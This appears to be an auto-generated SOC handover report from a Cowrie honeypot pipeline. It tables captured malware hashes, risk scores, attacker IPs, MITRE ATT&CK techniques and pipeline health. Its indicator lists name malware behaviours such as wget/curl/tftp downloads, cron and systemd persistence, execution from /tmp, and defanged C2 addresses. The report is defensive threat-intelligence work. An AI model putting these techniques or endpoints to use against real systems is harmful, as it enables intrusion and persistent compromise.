| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `14.47.200[.]242` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `179.43.153[.]2` | PA | PRIVATE LAYER INC | **100** ⚠️ | 16 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `137.184.169[.]96` | CA | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `2.57.122[.]150` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `115.28.198[.]131` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `35.146.185[.]132` | US | Charter Communications LLC | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 2 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 29 cases |
| Tool 34  | Credential Extractor        | ✅ 81 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (17.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 35 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 15 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-25T02:12:16Z_
